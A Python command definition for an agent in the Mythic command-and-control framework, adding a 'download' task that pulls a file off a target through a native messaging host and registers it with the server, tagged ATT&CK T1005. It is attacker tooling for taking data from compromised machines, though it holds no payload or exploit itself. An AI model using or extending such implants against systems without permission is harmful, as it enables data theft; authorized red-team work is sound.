from mythic_container.MythicCommandBase import *


class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="Path to read.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="chunk_size",
                type=ParameterType.Number,
                description="Transfer chunk size.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
                default_value=512000,
            ),
        ]

    async def parse_arguments(self):
        command_line = self.command_line.strip()
        if not command_line:
            raise ValueError("download requires a path")
        if command_line[0] == "{":
            self.load_args_from_json_string(command_line)
            return
        parts = command_line.split()
        self.add_arg("path", parts[0])


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download <path>"
    description = "Download a file through the native messaging host and register it with Mythic."
    version = 2
    author = "@kingofthenops"
    attackmapping = ["T1005"]
    argument_class = DownloadArguments
    supported_ui_features = ["file_browser:download"]
    browser_script = BrowserScript(
        script_name="download", author="@kingofthenops", for_new_ui=True
    )
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        path = taskData.args.get_arg("path") or ""
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=path,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
